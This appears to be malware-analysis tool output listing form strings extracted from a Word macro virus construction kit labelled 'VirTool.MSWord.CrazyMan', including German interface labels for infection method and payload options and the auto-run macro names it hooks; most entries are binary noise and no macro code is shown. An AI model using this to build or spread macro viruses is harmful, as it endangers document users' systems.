VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   �ffne vorhandendes Dokument ...  
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33330
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��33330
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormVirus/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Und los geht es ...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Lieber nicht�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 mein PGP-Schl�ssel
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�����"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wwwww�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x���w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wwp��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mister Spock
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Infect Metode
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PayLoadM

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Virus-Infood
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ich habe die Bedingungen verstanden, und akzeptiere sie.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������p��;�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;���p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ACHTUNG !!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mister Spock�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AutoNew
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AutoOpen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AutoCloseme.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i18/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Document_Open
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Document_CloseV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Document_New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ACHTUNG bei Auto-Makros !!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������p��;�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
